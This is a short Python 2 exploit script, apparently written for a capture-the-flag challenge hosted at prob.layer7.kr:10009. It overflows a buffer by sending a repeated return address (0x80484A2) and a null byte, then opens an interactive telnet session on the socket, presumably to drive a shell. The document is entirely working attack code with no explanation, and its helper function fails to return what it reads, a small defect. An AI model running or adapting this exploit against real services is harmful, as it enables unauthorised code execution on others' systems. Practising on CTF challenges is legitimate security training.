import socket
import struct
import telnetlib
from hexdump import * 

def recv_until(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp : break
		r += tmp
s= socket.create_connection(['prob.layer7.kr', 10009])
#s = socket.create_connection(['0',1234])
raw_input()
print recv_until(s,'input :')
dat = ""
dat += struct.pack('<I',0x80484A2)*(0x84/4)
dat += "\x00"
s.send(dat)#struct.pack('<I',0x8048332+4))
#s.recv(1024)
t = telnetlib.Telnet()
t.sock = s
t.interact()
